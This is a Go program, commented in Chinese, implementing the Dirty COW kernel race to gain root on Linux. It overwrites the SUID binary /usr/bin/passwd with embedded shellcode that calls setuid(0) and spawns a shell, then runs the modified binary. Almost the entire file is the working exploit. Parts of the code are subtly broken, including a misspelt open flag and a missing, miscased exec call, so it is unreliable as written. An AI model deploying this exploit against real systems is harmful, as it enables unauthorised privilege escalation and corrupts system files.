package main

import (
	"bytes"
	"fmt"
	"log"
	"os"
	"syscall"
	"time"
)

// 脏牛提权

var (
	signales = make(chan bool) // 协程控制
	mmap     uintptr           //https://blog.csdn.net/hello_ufo/article/details/86713947   uintptr
)

const SuidBinary = "/usr/bin/passwd"

// shellcode
var sc = []byte{
	0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
	0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
	0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
	0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,
	0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,
}

func madvise() {
	for i := 0; i < 1000000; i++ {
		select {
		case <-signales:
			fmt.Println("mad done") // 接收到信号停止
			return
		default:
			syscall.Syscall(syscall.SYS_MADVISE, mmap, uintptr(100), syscall.MADV_DONTNEED) // syscall  https://www.bilibili.com/read/cv17087054
		}
	}
}

func procselfmem(payload []byte) {
	f, err := os.OpenFile("/proc/self/mem", syscall.O_ROWR, 0)
	if err != nil {
		log.Fatalln(err)
	}

	for i := 0; i < 1000000; i++ {
		select {
		case <-signales:
			fmt.Println("procelfmem done")
			return
		default:
			// f.Fd() 返回句柄
			syscall.Syscall(syscall.SYS_LSEEK, f.Fd(), mmap, uintptr(os.SEEK_SET))
			f.Write(payload) // 将payload写入

		}
	}

}

func waitForWrite() {
	buf := make([]byte, len(sc))

	for {
		f, err := os.Open(SuidBinary)
		if err != nil {
			log.Fatal(err)
		}
		if _, err := f.Read(buf); err != nil {
			log.Fatal(err)
		}

		f.Close()

		// 文件发生了改变
		if bytes.Compare(buf, sc) == 0 {
			fmt.Println("文件改变")
			break
		}
		time.Sleep(time.Second)
	}

	// 结束连个协程
	signales <- true

	// https://www.jianshu.com/p/67dfc9ae74ed 运行程序

	// 设置进程的属性
	attr := os.ProcAttr{
		Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
	}

	// 执行替换的二进制文件，并传入设置的属性
	proc, err := os.StartProcess(SuidBinary, nil, &attr)
	if err != nil {
		log.Fatal(err)
	}
	proc.Wait()
	// 等待进程p的退出，返回进程状态
	// ps, _ := p.Wait();
	// fmt.Println(ps.String());
	os.Exit(0)

}

func main() {
	fmt.Println("dirtycow root 提权")

	fmt.Printf("备份%s到/tmp/bak\n", SuidBinary)
	backcp := exec.command("cp", SuidBinary, "/tmp/bak")

	if err := backcp.Run(); err != nil {
		panic(err)
	}

	f, err := os.OpenFile(SuidBinary, os.O_RDONLY, 0600)
	if err != nil {
		panic(err)
	}

	st, _ := f.Stat() // 获取文件的stat信息

	// 创建同样大小的payload
	payload := make([]byte, st.Size())

	for i := range payload {
		payload[i] = 0x90
	}

	for i, v := range sc {
		payload[i] = v
	}

	mmap, _, _ = syscall.Syscall(syscall.SYS_MMAP, uintptr(0), uintptr(st.Size()), uintptr(syscall.PROT_READ), uintptr(syscall.MAP_PRIVATE), f.Fd(), 0)

	fmt.Println()
	go madvise()
	go procselfmem(payload)
	waitForWrite()

}
